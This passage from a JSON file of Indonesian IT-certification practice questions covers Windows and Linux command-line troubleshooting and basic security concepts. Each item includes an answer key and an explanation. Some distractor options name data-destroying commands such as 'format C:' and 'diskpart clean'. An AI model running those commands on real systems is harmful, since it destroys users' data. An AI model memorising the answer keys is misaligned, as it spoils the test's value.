    "explanation": "`ipconfig /flushdns` menghapus seluruh entri pemetaan nama-ke-IP yang tersimpan sementara di memori resolver DNS klien Windows, memaksa sistem melakukan resolusi DNS segar ke server DNS.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-2",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Perbaikan File Sistem Windows yang Korup: SFC & DISM",
    "sourceRef": "CompTIA A+ Core 2: Chapter 4 (Troubleshooting Operating Systems)",
    "scenario": "Sistem operasi Windows 11 sering menampilkan pesan galat file DLL hilang dan fungsi Start Menu sering macet setelah pemadaman listrik mendadak saat update berlangsung.",
    "workedExample": {
      "kasusSerupa": "Mengunduh citra komponen sistem Windows yang bersih langsung dari server Microsoft Windows Update.",
      "jawabanBenarContoh": "Perintah DISM /Online /Cleanup-Image /RestoreHealth — memperbaiki citra komponen Windows dari internet.",
      "nalarBayi": "DISM memperbaiki master citra Windows."
    },
    "question": "Perintah utilitas bawaan Windows Command Prompt (Admin) manakah yang bertugas memindai dan memperbaiki file integritas sistem yang rusak secara otomatis?",
    "options": [
      "sfc /scannow",
      "diskpart clean",
      "chkdsk /f",
      "format C:"
    ],
    "correctIndex": 0,
    "explanation": "System File Checker (`sfc /scannow`) memindai semua berkas sistem terlindungi dan mengganti versi yang rusak atau hilang dengan salinan cadangan yang tersimpan di cache `%WinDir%\\System32\\dllcache`.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-3",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Menghentikan Proses Macet Melalui Command Prompt: Taskkill",
    "sourceRef": "CompTIA A+ Core 2: Chapter 3 (Windows Process Management)",
    "scenario": "Sebuah aplikasi background database kantor mengalami freeze total (Not Responding) dan tidak bisa ditutup melalui GUI Task Manager karena interface desktop sedang tidak responsif.",
    "workedExample": {
      "kasusSerupa": "Melihat daftar seluruh proses yang sedang aktif berjalan di komputer Windows beserta nomor Process ID (PID).",
      "jawabanBenarContoh": "Perintah tasklist — menampilkan tabel nama proses dan nomor PID-nya.",
      "nalarBayi": "Perintah tasklist untuk melihat daftar proses."
    },
    "question": "Parameter sintaks Windows CLI manakah yang digunakan untuk mematikan secara PAKSA proses yang sedang berjalan berdasarkan nomor ID prosesnya?",
    "options": [
      "kill -stop [nomor]",
      "taskkill /F /PID [nomor]",
      "exit /now [nomor]",
      "stop-process -all"
    ],
    "correctIndex": 1,
    "explanation": "Perintah `taskkill /F /PID <nomor_pid>` menggunakan switch `/F` untuk memaksa (force) penghentian proses tak responsif dan `/PID` untuk menentukan nomor proses target spesifik.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-4",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Hak Akses Berkas Linux: Nilai Oktal chmod 755",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux and macOS Operating Systems)",
    "scenario": "Administrator web server Linux hendak mengatur hak akses pada skrip eksekusi `deploy.sh`. Pemilik berkas harus memiliki akses penuh (Read, Write, Execute), sedangkan anggota grup dan publik hanya boleh membaca dan mengeksekusi (Read, Execute).",
    "workedExample": {
      "kasusSerupa": "Memberikan izin baca dan tulis untuk pemilik berkas, serta izin baca saja untuk kelompok dan publik di Linux.",
      "jawabanBenarContoh": "chmod 644 (Owner: rw- = 6, Group: r-- = 4, Others: r-- = 4).",
      "nalarBayi": "Izin 644 untuk dokumen biasa (pemilik bisa edit, orang lain cuma baca)."
    },
    "question": "Berapakah nilai mode oktal dari perintah `chmod` yang memberikan hak Read-Write-Execute kepada Owner, dan Read-Execute kepada Group dan Others (`rwxr-xr-x`)?",
    "options": [
      "644",
      "755",
      "700",
      "777"
    ],
    "correctIndex": 1,
    "explanation": "Nilai permission oktal Linux dihitung dari: r=4, w=2, x=1. Owner: 4+2+1=7. Group: 4+1=5. Others: 4+1=5. Hasil perizinan `rwxr-xr-x` bernilai numerik 755.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-5",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pemantauan Beban CPU dan Memori Real-Time di Linux",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux Utilities)",
    "scenario": "Server web Ubuntu dilaporkan lambat merespons permintaan pengguna. Administrator ingin melihat konsumsi CPU dan RAM secara langsung (live update) dari setiap proses yang sedang berjalan di terminal SSH.",
    "workedExample": {
      "kasusSerupa": "Melihat penggunaan memori RAM yang terpakai dan tersisa di Linux dalam format satuan megabyte/gigabyte yang mudah dibaca.",
      "jawabanBenarContoh": "Perintah free -h — menampilkan status memori RAM dan Swap secara ringkas.",
      "nalarBayi": "Perintah free -h untuk cek sisa RAM."
    },
    "question": "Perintah terminal Linux manakah yang menyediakan tampilan tabel dinamis dan interaktif secara real-time mengenai proses sistem dan utilisasi CPU/RAM?",
    "options": [
      "top",
      "ls -la",
      "uname -r",
      "pwd"
    ],
    "correctIndex": 0,
    "explanation": "Perintah `top` menampilkan ringkasan informasi sistem dan daftar proses yang sedang dikelola oleh kernel Linux secara real-time, diperbarui setiap beberapa detik.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-6",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pemantauan Log Sistem Secara Langsung dengan tail -f",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux Troubleshooting)",
    "scenario": "Administrator sedang menguji formulir pendaftaran baru di web server Apache. Administrator ingin melihat baris-baris pesan kesalahan baru yang masuk ke berkas `/var/log/apache2/error.log` secara langsung saat aksi klik dilakukan di browser.",
    "workedExample": {
      "kasusSerupa": "Membaca sepuluh baris pertama dari sebuah berkas teks di terminal Linux.",
      "jawabanBenarContoh": "Perintah head -n 10 berkas.txt — mencetak 10 baris teratas.",
      "nalarBayi": "Perintah head mencetak baris atas."
    },
    "question": "Opsi perintah terminal Linux manakah yang digunakan untuk menampilkan baris akhir dari sebuah file log dan terus memantau perubahan data baru secara real-time (follow)?",
    "options": [
      "head -n",
      "grep -v",
      "tail -f",
      "cat -E"
    ],
    "correctIndex": 2,
    "explanation": "Perintah `tail -f [nama_file]` menampilkan 10 baris terakhir dari sebuah berkas dan opsi `-f` (follow) membuat terminal tetap terbuka mendengarkan baris teks baru yang ditambahkan ke berkas tersebut.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-7",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Partisi Disk Modern: MBR vs GPT untuk Drive Lebih dari 2 TB",
    "sourceRef": "CompTIA A+ Core 2: Chapter 2 (Storage Configuration)",
    "scenario": "Teknisi memasang harddisk baru berkapasitas 8 TB untuk backup kantor. Saat menginisialisasi disk di Disk Management, teknisi harus memilih skema tabel partisi agar seluruh kapasitas 8 TB dapat dialokasikan dalam satu partisi besar.",
    "workedExample": {
      "kasusSerupa": "Skema partisi harddisk lawas masa BIOS lama yang hanya mendukung maksimal 4 partisi primer dan kapasitas drive maksimal 2 Terabyte.",
      "jawabanBenarContoh": "MBR (Master Boot Record) — skema partisi lama dengan batas kapasitas 2 TB.",
      "nalarBayi": "MBR terbatas pada kapasitas 2 TB dan 4 partisi."
    },
    "question": "Skema tabel partisi disk manakah yang mendukung kapasitas penyimpanan di atas 2 Terabyte dan kompatibel dengan sistem boot modern UEFI?",
    "options": [
      "MBR (Master Boot Record)",
      "Dynamic FAT16",
      "GPT (GUID Partition Table)",
      "FAT32 File Table"
    ],
    "correctIndex": 2,
    "explanation": "GPT (GUID Partition Table) adalah bagian dari standar UEFI yang mengatasi keterbatasan MBR lama (maks 2 TB dan maks 4 partisi utama), mendukung disk hingga jutaan Terabyte dan integritas CRC32.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-8",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pemeriksaan Port Terbuka di Linux dengan Perintah ss / netstat",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux Networking)",
    "scenario": "Administrator baru saja menginstal server database MySQL di VPS Linux. Administrator ingin memastikan apakah port MySQL (3306) sudah aktif mendengarkan (listening) koneksi jaringan TCP.",
    "workedExample": {
      "kasusSerupa": "Menguji apakah port web server di komputer jarak jauh terbuka menggunakan utilitas curl.",
      "jawabanBenarContoh": "curl -I http://ip-server:port — mengirimkan header HTTP untuk uji respons port.",
      "nalarBayi": "Curl menguji koneksi dari luar."
    },
    "question": "Kombinasi parameter perintah terminal Linux `ss` manakah yang paling lengkap digunakan untuk melihat semua port TCP dan UDP yang sedang berada dalam status LISTENING beserta nomor PID aplikasinya?",
    "options": [
      "ss -ping",
      "ss -route",
      "ss -tulnp",
      "ss -killall"
    ],
    "correctIndex": 2,
    "explanation": "Perintah `ss -tulnp` menampilkan soket TCP (-t), UDP (-u), dalam mode listening (-l), dengan port dan IP numerik tanpa lookup DNS (-n), beserta nama proses/PID penanggung jawab (-p).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-9",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Analisis Log Kesalahan Windows Melalui Event Viewer",
    "sourceRef": "CompTIA A+ Core 2: Chapter 4 (Windows Diagnostic Tools)",
    "scenario": "Komputer akuntansi mengalami crash mendadak setiap jam 14:00 saat membuat faktur pajak. Teknisi perlu memeriksa catatan log sistem operasi untuk melihat pesan error, kode kegagalan, dan sumber aplikasi penyebab crash.",
    "workedExample": {
      "kasusSerupa": "Menguji dan mengubah konfigurasi servis Windows melalui konsol Services Management.",
      "jawabanBenarContoh": "services.msc — membuka konsol pengelolaan servis latar belakang Windows.",
      "nalarBayi": "Services.msc mengatur status servis Windows."
    },
    "question": "Alat utilitas administratif Windows manakah yang digunakan untuk melihat dan menganalisis log kesalahan sistem operasi, kegagalan driver, dan crash aplikasi?",
    "options": [
      "Event Viewer (eventvwr.msc)",
      "Registry Editor",
      "Defragment and Optimize Drives",
      "Device Manager"
    ],
    "correctIndex": 0,
    "explanation": "Event Viewer adalah alat Microsoft Management Console (MMC) yang menampilkan log peristiwa terperinci yang dicatat oleh sistem operasi dan aplikasi, dikelompokkan ke log Application, Security, dan System.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-10",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Penjadwalan Tugas Otomatis di Linux dengan Format Waktu Cron",
    "sourceRef": "Automate the Boring Stuff with Python / Linux Admin",
    "scenario": "Administrator sistem ingin mengatur agar skrip pencadangan database `/opt/backup.sh` berjalan secara otomatis setiap hari tepat pada pukul 02:00 dini hari menggunakan crontab.",
    "workedExample": {
      "kasusSerupa": "Format waktu crontab di Linux yang mengeksekusi skrip otomatis setiap satu jam sekali tepat pada menit ke-0.",
      "jawabanBenarContoh": "0 * * * * /opt/skrip.sh — berjalan di menit ke-0 pada setiap jam.",
      "nalarBayi": "Format '0 * * * *' berjalan setiap jam."
    },
    "question": "Sintaks crontab Linux manakah yang benar untuk menjalankan skrip cadangan setiap hari tepat pada pukul 02:00 pagi?",
    "options": [
      "0 0 2 * * /opt/backup.sh",
      "0 2 * * * /opt/backup.sh",
      "2 0 * * * /opt/backup.sh",
      "* 2 * * * /opt/backup.sh"
    ],
    "correctIndex": 1,
    "explanation": "Field crontab terdiri dari: [Menit] [Jam] [Hari/Bulan] [Bulan] [Hari/Minggu]. Pukul 02:00 dinyatakan dengan Menit 0 dan Jam 2: `0 2 * * *`.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-11",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Struktur Registry Windows: HKEY_LOCAL_MACHINE (HKLM)",
    "sourceRef": "CompTIA A+ Core 2: Chapter 3 (Windows Internal Architecture)",
    "scenario": "Seorang teknisi sedang mengatur kebijakan perangkat keras agar seluruh port USB terkunci untuk SEMUA pengguna yang login ke komputer tersebut, bukan hanya untuk pengguna tertentu yang sedang aktif.",
    "workedExample": {
      "kasusSerupa": "Bagian cabang Registry Windows yang menyimpan konfigurasi khusus profil pengguna yang sedang login saat ini.",
      "jawabanBenarContoh": "HKEY_CURRENT_USER (HKCU) — menyimpan pengaturan tema, preferensi, dan aplikasi user aktif.",
      "nalarBayi": "HKCU khusus untuk user yang sedang login."
    },
    "question": "Cabang utama (hive) Registry Windows manakah yang menyimpan pengaturan perangkat lunak dan perangkat keras global yang berlaku untuk SELURUH pengguna di komputer tersebut?",
    "options": [
      "HKEY_CLASSES_ROOT (HKCR)",
      "HKEY_CURRENT_USER (HKCU)",
      "HKEY_CURRENT_CONFIG (HKCC)",
      "HKEY_LOCAL_MACHINE (HKLM)"
    ],
    "correctIndex": 3,
    "explanation": "HKEY_LOCAL_MACHINE (HKLM) berisi informasi konfigurasi tingkat sistem tentang perangkat keras fisik, driver, dan pengaturan perangkat lunak yang berlaku untuk seluruh akun pengguna di PC.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-12",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pencarian Kata Kunci Log di Linux Menggunakan Utilitas Grep",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux Text Manipulation)",
    "scenario": "File log autentikasi `/var/log/auth.log` memiliki ukuran sangat besar dengan jutaan baris teks. Administrator ingin menyaring dan menampilkan HANYA baris-baris yang mengandung kata 'Failed password' tanpa memedulikan huruf besar/kecil.",
    "workedExample": {
      "kasusSerupa": "Menghitung jumlah total baris di dalam sebuah berkas log teks di Linux menggunakan utilitas wc.",
      "jawabanBenarContoh": "wc -l berkas.log — menghitung baris (word count line).",
      "nalarBayi": "Perintah wc -l menghitung jumlah baris."
    },
    "question": "Perintah terminal Linux manakah yang digunakan untuk mencari baris teks tertentu di dalam sebuah file dengan mengabaikan perbedaan huruf besar dan kecil (case-insensitive)?",
    "options": [
      "sed -d \"kata_kunci\" berkas.log",
      "grep -i \"kata_kunci\" berkas.log",
      "find -name berkas.log",
      "awk -F berkas.log"
    ],
    "correctIndex": 1,
    "explanation": "Perintah `grep` (Global Regular Expression Print) mencari pola teks di dalam berkas. Opsi `-i` mengabaikan perbedaan kapitalisasi huruf (case-insensitive search).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-13",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Analisis Penyebab Blue Screen of Death (BSOD) via Minidump",
    "sourceRef": "CompTIA A+ Core 2: Chapter 4 (Troubleshooting Operating Systems)",
    "scenario": "Sebuah PC mengalami crash layar biru (Blue Screen of Death / BSOD) dengan kode galat `DRIVER_IRQL_NOT_LESS_OR_EQUAL`. Teknisi ingin menganalisis file rekaman memori crash untuk menemukan driver perangkat yang memicu kegagalan.",
    "workedExample": {
      "kasusSerupa": "Lokasi file log instalasi pembaruan Windows Update untuk menganalisis kegagalan patch.",
      "jawabanBenarContoh": "C:\\Windows\\WindowsUpdate.log — riwayat catatan instalasi paket pembaruan Windows.",
      "nalarBayi": "Log update ada di WindowsUpdate.log."
    },
    "question": "Direktori default Windows manakah yang menyimpan berkas rekam jejak memori kecil (.dmp) saat terjadi kegagalan fatal Blue Screen (BSOD)?",
    "options": [
      "C:\\Windows\\Minidump",
      "C:\\ProgramData\\Temp",
      "C:\\Users\\Public\\Crash",
      "C:\\Windows\\System32\\Spool"
    ],
    "correctIndex": 0,
    "explanation": "Secara default, Windows membuat berkas Small Memory Dump (Minidump) di direktori `%SystemRoot%\\Minidump` (biasanya `C:\\Windows\\Minidump`) yang dapat dianalisis untuk mengidentifikasi modul driver penyebab BSOD.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-14",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pengelolaan Layanan Sistem Linux Modern dengan Systemctl",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux System Services)",
    "scenario": "Setelah memperbarui file konfigurasi situs web Nginx di server CentOS/Ubuntu, administrator harus memuat ulang atau merestart layanan Nginx agar konfigurasi baru diterapkan.",
    "workedExample": {
      "kasusSerupa": "Memeriksa status aktif atau matinya layanan servis web server di Linux berbasis Systemd.",
      "jawabanBenarContoh": "sudo systemctl status nginx — memeriksa apakah servis sedang running atau stopped.",
      "nalarBayi": "Manajer layanan sistem operasi menyediakan instruksi terpusat untuk memantau status aktivitas latar belakang."
    },
    "question": "Perintah standar sistem Linux modern (systemd) manakah yang digunakan untuk memuat ulang dan merestart sebuah layanan aplikasi bernama `nginx`?",
    "options": [
      "killall -start nginx",
      "service stop-all nginx",
      "sudo systemctl restart nginx",
      "init 6 nginx"
    ],
    "correctIndex": 2,
    "explanation": "Pada distribusi Linux berbasis systemd, utilitas `systemctl` mengontrol status layanan sistem. Perintah `sudo systemctl restart <service>` merestart layanan target.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-15",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Troubleshooting Driver Rusak Melalui Windows Safe Mode",
    "sourceRef": "CompTIA A+ Core 2: Chapter 4 (Windows Startup Troubleshooting)",
    "scenario": "Setelah menginstal driver kartu grafis baru yang salah unduh, PC pengguna selalu freeze hitam sesaat sebelum layar login Windows muncul. Teknisi perlu memuat Windows hanya dengan driver dasar VGA generik.",
    "workedExample": {
      "kasusSerupa": "Memulihkan Windows ke titik waktu sebelumnya sebelum terjadinya kesalahan konfigurasi menggunakan System Restore.",
      "jawabanBenarContoh": "System Restore (rstrui.exe) — memutar kembali status file sistem dan registry ke titik restore point.",
      "nalarBayi": "System Restore memungkinkan sistem operasi kembali ke titik waktu stabil sebelum instalasi perangkat lunak yang bermasalah."
    },
    "question": "Mode diagnostik startup Windows manakah yang hanya memuat sekumpulan minimal driver perangkat keras dan layanan inti penting untuk isolasi masalah?",
    "options": [
      "Safe Mode (Mode Aman)",
      "Windows Sandbox Mode",
      "Audit Mode Sysprep",
      "Normal Startup with Clean Boot"
    ],
    "correctIndex": 0,
    "explanation": "Safe Mode adalah lingkungan pemecahan masalah di mana Windows memuat driver generik minimal tanpa aplikasi pihak ketiga, memungkinkan teknisi mencopot driver atau software bermasalah.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-16",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pengecekan Ruang Partisi Disk Linux dengan Perintah df -h",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux Storage Management)",
    "scenario": "Aplikasi web tidak bisa menyimpan file unggahan baru karena kuota penyimpanan server penuh. Administrator ingin melihat ringkasan kapasitas sisa pada seluruh partisi penyimpanan fisik dalam satuan yang mudah dibaca manusia (Gigabyte/Megabyte).",
    "workedExample": {
      "kasusSerupa": "Melihat ukuran kapasitas sebuah folder tertentu beserta isinya di Linux.",
      "jawabanBenarContoh": "Perintah du -sh /nama/folder — disk usage summary dalam format terbaca manusia.",
      "nalarBayi": "Perintah du untuk kapasitas satu folder."
    },
    "question": "Perintah terminal Linux manakah yang menampilkan kapasitas ruang kosong dan terpakai pada setiap partisi filesystem dengan format angka yang mudah dibaca manusia (GB/MB)?",
    "options": [
      "mkfs.ext4",
      "df -h",
      "lsblk -a",
      "fdisk -l"
    ],
    "correctIndex": 1,
    "explanation": "`df -h` (Disk Free) menampilkan penggunaan partisi dalam format human-readable (-h, misalnya GB atau MB). Sebaliknya, `du -sh` digunakan untuk memeriksa ukuran folder tertentu.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-17",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Karakteristik File System: Batas Ukuran File FAT32 4 GB",
    "sourceRef": "CompTIA A+ Core 2: Chapter 2 (File Systems)",
    "scenario": "Seorang staf kantor ingin menyalin file rekaman video seminar berukuran 6.5 GB ke dalam flashdisk USB 32 GB. Saat proses copy dimulai, Windows menampilkan galat 'The file is too large for the destination file system', padahal sisa ruang kosong flashdisk masih 25 GB.",
    "workedExample": {
      "kasusSerupa": "Ukuran partisi maksimal yang didukung oleh sistem berkas NTFS pada sistem operasi Windows modern.",
      "jawabanBenarContoh": "Hingga ratusan Terabyte bahkan Petabyte per partisi.",
      "nalarBayi": "NTFS mendukung file raksasa hingga terabyte."
    },
    "question": "Berapakah batas ukuran maksimal untuk SATU berkas file tunggal yang dapat disimpan pada partisi dengan sistem berkas FAT32?",
    "options": [
      "8 Gigabyte (8 GB)",
      "16 Gigabyte (16 GB)",
      "4 Gigabyte (4 GB)",
      "2 Gigabyte (2 GB)"
    ],
    "correctIndex": 2,
    "explanation": "Sistem berkas FAT32 memiliki keterbatasan teknis 32-bit: ukuran berkas individual maksimum adalah 4 GB minus 1 byte (4 GB). Untuk menyimpan berkas lebih besar, media harus diformat ke exFAT atau NTFS.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-18",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pengubahan Kepemilikan Berkas Linux dengan Perintah chown",
    "sourceRef": "CompTIA A+ Core 2: Chapter 6 (Linux User Rights)",
    "scenario": "File konfigurasi web `/var/www/html/index.php` secara tidak sengaja dimiliki oleh akun `root`. Akibatnya, server web Apache yang berjalan di bawah pengguna `www-data` tidak dapat memperbarui file tersebut.",
    "workedExample": {
      "kasusSerupa": "Mengubah izin akses baca, tulis, dan eksekusi pada suatu berkas di sistem operasi Linux.",
      "jawabanBenarContoh": "Perintah chmod (change mode) — mengubah atribut izin berkas.",
      "nalarBayi": "Perintah chmod mengatur hak izin r-w-x."
    },
    "question": "Perintah terminal Linux manakah yang digunakan secara khusus untuk mengubah pemilik (user owner) dan grup kepemilikan dari sebuah file atau direktori?",
    "options": [
      "chmod",
      "usermod",
      "chown",
      "chgrp only"
    ],
    "correctIndex": 2,
    "explanation": "`chown` (Change Owner) digunakan untuk mengubah akun pengguna pemilik dan grup kepemilikan dari suatu berkas atau direktori di Linux (`chown user:group file`).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-19",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Mengecilkan Volume Partisi Windows: Fitur Shrink Volume",
    "sourceRef": "CompTIA A+ Core 2: Chapter 2 (Disk Management Console)",
    "scenario": "Sebuah laptop baru hanya memiliki satu partisi besar (Drive C: berukuran 1 TB). Pengguna ingin membaginya menjadi Drive C: (300 GB) untuk sistem dan Drive D: (700 GB) untuk dokumen kerja tanpa memformat ulang Windows.",
    "workedExample": {
      "kasusSerupa": "Memperluas ukuran partisi disk Windows ke ruang kosong unallocated space yang bersebelahan.",
      "jawabanBenarContoh": "Fitur Extend Volume pada Disk Management (diskmgmt.msc).",
      "nalarBayi": "Manajemen partisi disk memungkinkan penyesuaian ukuran ruang simpan sesuai kapasitas yang masih tersedia."
    },
    "question": "Operasi manakah pada konsol Windows Disk Management yang digunakan untuk mengurangi ukuran partisi yang ada guna menghasilkan ruang kosong (unallocated space) untuk partisi baru?",
    "options": [
      "Shrink Volume",
      "Format Volume",
      "Striped Volume",
      "Extend Volume"
    ],
    "correctIndex": 0,
    "explanation": "Fitur 'Shrink Volume' di Disk Management memperkecil ukuran partisi NTFS yang ada dengan memindahkan batas partisi ke ruang yang tidak digunakan, menciptakan Unallocated Space tanpa menghapus data yang ada.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-20",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Konfigurasi Variabel Lingkungan PATH pada Sistem Operasi",
    "sourceRef": "CompTIA A+ Core 2: Chapter 3 / Automate Python (System Environment)",
    "scenario": "Seorang pengembang menginstal interpreter Python ke direktori `C:\\Program Files\\Python310`. Saat mengetik perintah `python` di Command Prompt biasa, Windows membalas 'python is not recognized as an internal or external command'.",
    "workedExample": {
      "kasusSerupa": "Variabel lingkungan sistem operasi yang menunjukkan nama folder home direktori pengguna yang sedang aktif.",
      "jawabanBenarContoh": "%USERPROFILE% di Windows atau $HOME di Linux.",
      "nalarBayi": "Variabel HOME menunjuk ke folder pengguna."
    },
    "question": "Variabel lingkungan (Environment Variable) manakah yang memberi tahu sistem operasi daftar direktori tempat mencari program executable saat perintah diketik di terminal?",
    "options": [
      "TEMP",
      "SYSTEMROOT",
      "PATH",
      "COMSPEC"
    ],
    "correctIndex": 2,
    "explanation": "Variabel lingkungan `PATH` menyimpan daftar direktori yang dipisahkan titik koma (di Windows) atau titik dua (di Linux). Saat sebuah perintah diketik tanpa path lengkap, shell mencari berkas eksekusi di setiap direktori dalam variabel PATH.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-1",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Prinsip Fundamental Keamanan Informasi: The CIA Triad",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 1 (Security Concepts and Principles)",
    "scenario": "Sebuah rumah sakit membutuhkan jaminan bahwa data rekam medis pasien hanya bisa dibaca oleh dokter yang berhak (Kerahasiaan), data tidak diubah diam-diam oleh orang lain (Integritas), dan sistem tetap bisa diakses saat pasien gawat darurat (Ketersediaan).",
    "workedExample": {
      "kasusSerupa": "Mencegah pihak yang tidak berhak membaca data rahasia perusahaan (pilar Confidentiality).",
      "jawabanBenarContoh": "Kerahasiaan (Confidentiality) — perlindungan data dari akses atau pengungkapan tanpa izin.",
      "nalarBayi": "Prinsip Kerahasiaan (Confidentiality) memastikan hanya individu dengan wewenang resmi yang dapat mengakses berkas sensitif."
    },
    "question": "Manakah tiga komponen pilar utama yang membentuk segitiga fundamental keamanan informasi (The CIA Triad)?",
    "options": [
      "Confidentiality, Integrity, Availability",
      "Cryptographic, Identity, Authorization",
      "Cyber, Internet, Access",
      "Control, Inspection, Authentication"
    ],
    "correctIndex": 0,
    "explanation": "The CIA Triad (Confidentiality, Integrity, Availability) adalah model keamanan informasi dasar. Confidentiality mencegah akses tidak sah, Integrity menjamin keaslian data, dan Availability memastikan sistem dapat diakses saat diperlukan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-2",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Klasifikasi Serangan Rekayasa Sosial: Spear Phishing",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 3 (Threat Actors and Social Engineering)",
    "scenario": "Direktur Keuangan perusahaan menerima email dari pengirim yang mengaku sebagai CEO, mencantumkan nama proyek rahasia yang sedang dikerjakan secara akurat, dan mendesak transfer dana darurat senilai 500 juta ke vendor luar negeri.",
    "workedExample": {
      "kasusSerupa": "Pengiriman email penipuan massal acak ke jutaan alamat secara umum tanpa target spesifik.",
      "jawabanBenarContoh": "Bulk Phishing (Phishing Massal) — penipuan email acak berumpan hadiah atau ancaman palsu.",
      "nalarBayi": "Pola serangan siber massal mengirimkan ribuan umpan palsu secara acak ke berbagai alamat email."
    },
    "question": "Bentuk serangan rekayasa sosial manakah yang menargetkan individu atau departemen tertentu secara spesifik menggunakan informasi personal hasil riset mendalam?",
    "options": [
      "Spear Phishing",
      "Watering Hole tanpa target",
      "Spam Phishing Massal",
      "Vishing Acak"
    ],
    "correctIndex": 0,
    "explanation": "Spear Phishing adalah taktik phishing terarah yang menggunakan informasi personal korban (nama, jabatan, rekan kerja, proyek) agar pesan rekayasa sosial tampak sangat meyakinkan dan kredibel bagi target tertentu.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-3",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Kriptografi: Perbedaan Kunci Enkripsi Simetris vs Asimetris",
